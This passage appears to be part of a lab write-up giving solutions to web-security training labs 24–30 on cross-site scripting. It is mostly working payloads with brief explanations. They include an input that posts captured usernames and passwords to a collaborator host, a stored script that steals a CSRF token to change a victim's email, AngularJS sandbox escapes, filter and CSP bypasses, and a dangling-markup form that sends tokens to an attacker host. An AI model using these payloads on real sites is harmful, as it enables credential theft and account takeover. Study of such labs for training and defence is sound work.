<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

#### LAB 24 — Exploiting XSS to bypass CSRF defenses
Stored XSS. Wait for `window.onload`, read CSRF token from DOM, submit email-change request on behalf of victim:
```html
<script>
window.onload = function() {
    var csrfToken = document.getElementsByName("csrf")[0].value;
    fetch('https://TARGET/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: 'email=attacker@evil.com&csrf=' + csrfToken
    });
};
</script>
```

---

### Expert

#### LAB 25 — Reflected XSS with AngularJS sandbox escape without strings
`$eval` disabled; string literals blocked. Use `fromCharCode` to build the payload and `orderBy` filter to evaluate it; override `charAt` to disable string guards:
```javascript
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
Decodes to: `x=alert(1)` executed via the `orderBy` expression filter.

#### LAB 26 — Reflected XSS with AngularJS sandbox escape and CSP
CSP blocks external scripts and `unsafe-inline`. Use `ng-focus` + `composedPath()` + `orderBy` — no external scripts needed; `#x` fragment auto-focuses the injected input:
```html
<script>
location='https://TARGET/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

#### LAB 27 — Reflected XSS with event handlers and href attributes blocked
Event handler attributes and `href` blocked on normal tags, but `<animate>` can set them dynamically. SVG animate sets `href` to a `javascript:` URI on click:
```html
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a></svg>
```

#### LAB 28 — Reflected XSS in JavaScript URL with some characters blocked
Input reflected inside a `fetch()` call; `()` are filtered. Exploit arrow function + `throw` + `onerror` coercion without parentheses:
```javascript
&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window,{x:'
```

#### LAB 29 — Reflected XSS protected by very strict CSP, with dangling markup attack
Script execution blocked by CSP; only HTML injection into an attribute is possible. Inject a dangling form that captures the victim's CSRF token:
```html
"></form><form class="login-form" name="evil-form" action="https://ATTACKER/log" method="GET"><button type="submit">Click me</button>
```
1. Deliver the redirect to the victim via exploit server.
2. CSRF token appears in attacker's server logs.
3. Use captured token in a CSRF PoC to change the victim's email.

#### LAB 30 — Reflected XSS protected by CSP, with CSP bypass
`script-src 'self'` set, but the `report-uri token` parameter is reflected unsanitised into the CSP header. Inject a semicolon-delimited directive override:
```
?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
```
This appends `script-src-elem 'unsafe-inline'` to the response CSP, allowing the inline `<script>` to execute.
